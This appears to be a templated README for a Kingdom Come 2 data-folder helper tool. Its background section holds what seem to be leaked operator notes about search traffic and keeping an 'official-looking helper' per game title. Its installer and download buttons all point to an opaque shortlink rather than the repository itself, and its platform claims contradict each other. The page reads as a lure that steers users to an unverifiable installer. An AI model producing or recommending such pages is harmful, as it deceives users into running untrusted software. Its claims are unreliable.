![Kingdom Come 2 Desktop](assets/hero.png)

# Kingdom Come 2 Desktop

*Find the Kingdom Come 2 folder fast and keep a local spare.*

## Overview

**Kingdom Come 2 Desktop** is a Windows utility. Local Windows and macOS helper for Kingdom Come 2 data paths, config and export caches, and export folders.

Patches move Kingdom Come 2 data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Locates Kingdom Come 2 user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Kingdom Come 2 is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/tmurphy1178/kingdom-come-2-desktop

MIT license. See `LICENSE`.
